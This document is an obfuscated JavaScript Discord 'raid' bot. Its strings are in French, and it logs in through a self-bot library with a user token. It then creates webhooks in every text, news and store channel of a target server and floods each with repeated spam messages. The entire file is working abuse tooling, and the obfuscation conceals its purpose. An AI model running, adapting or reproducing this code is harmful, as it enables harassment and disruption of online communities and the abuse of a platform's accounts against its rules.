const _0x2659=['ChannellMsgCount','text','login','serv','507783maLqHc','channels','send','black','2402lNdtII','651PfyYmb','cache','spamMsg','ready','Vous\x20devez\x20entrer\x20l\x27id\x20du\x20serveur\x20à\x20raid.','avatar','sleepMS','then','log','guilds','859066HYHPbk','bgRed','Bot\x20prêt\x20à\x20raid','4pWQydN','735qHpDPr','Client','2167101gTkpGz','createWebhook','name','store','discord.js-self','bgGreen','1101808QyrSzx','25464TfumWK','news','webhook','token','267RWukwD','type'];const _0x1e9e=function(_0x24d273,_0x29ba09){_0x24d273=_0x24d273-0x1a3;let _0x2659c9=_0x2659[_0x24d273];return _0x2659c9;};const _0x1b70cf=_0x1e9e;(function(_0x45dd6a,_0x4137a8){const _0x1dc493=_0x1e9e;while(!![]){try{const _0x14a141=parseInt(_0x1dc493(0x1c2))+-parseInt(_0x1dc493(0x1a7))+-parseInt(_0x1dc493(0x1ab))*parseInt(_0x1dc493(0x1c7))+-parseInt(_0x1dc493(0x1b6))+-parseInt(_0x1dc493(0x1ba))*parseInt(_0x1dc493(0x1ac))+-parseInt(_0x1dc493(0x1b9))*-parseInt(_0x1dc493(0x1c3))+parseInt(_0x1dc493(0x1bc));if(_0x14a141===_0x4137a8)break;else _0x45dd6a['push'](_0x45dd6a['shift']());}catch(_0x3311ba){_0x45dd6a['push'](_0x45dd6a['shift']());}}}(_0x2659,0xd7d81));const discord=require(_0x1b70cf(0x1c0)),colors=require('colors'),config=require('./config.json'),client=new discord[(_0x1b70cf(0x1bb))]();client[_0x1b70cf(0x1a5)](config[_0x1b70cf(0x1c6)]),client['on'](_0x1b70cf(0x1af),async()=>{const _0x3a4eb7=_0x1b70cf;console[_0x3a4eb7(0x1b4)](_0x3a4eb7(0x1b8)[_0x3a4eb7(0x1c1)][_0x3a4eb7(0x1aa)]);if(!config['serv'])return console['log'](_0x3a4eb7(0x1b0)[_0x3a4eb7(0x1b7)][_0x3a4eb7(0x1aa)]);const _0x4ce977=client[_0x3a4eb7(0x1b5)]['cache']['get'](config[_0x3a4eb7(0x1a6)]);if(!_0x4ce977)return console[_0x3a4eb7(0x1b4)]('L\x27id\x20que\x20vous\x20avez\x20entré\x20ne\x20correspond\x20pas\x20à\x20mes\x20serveurs.'['bgRed']['black']);_0x4ce977[_0x3a4eb7(0x1a8)][_0x3a4eb7(0x1ad)]['forEach'](async _0x3bd168=>{const _0x4e97d7=_0x3a4eb7;if(_0x3bd168[_0x4e97d7(0x1c8)]===_0x4e97d7(0x1a4)||_0x3bd168[_0x4e97d7(0x1c8)]===_0x4e97d7(0x1c4)||_0x3bd168['type']===_0x4e97d7(0x1bf))sleep(config[_0x4e97d7(0x1b2)]),_0x3bd168[_0x4e97d7(0x1bd)](config['webhook'][_0x4e97d7(0x1be)],{'avatar':config[_0x4e97d7(0x1c5)][_0x4e97d7(0x1b1)]})[_0x4e97d7(0x1b3)](_0x1b1397=>{const _0x270624=_0x4e97d7;counter=0x0;while(counter<config[_0x270624(0x1a3)]){_0x1b1397[_0x270624(0x1a9)](config[_0x270624(0x1c5)][_0x270624(0x1ae)]),counter++,sleep(0x3c);}});else return;});});function sleep(_0x2c38bf){return new Promise(_0x2bacb0=>setTimeout(_0x2bacb0,_0x2c38bf));}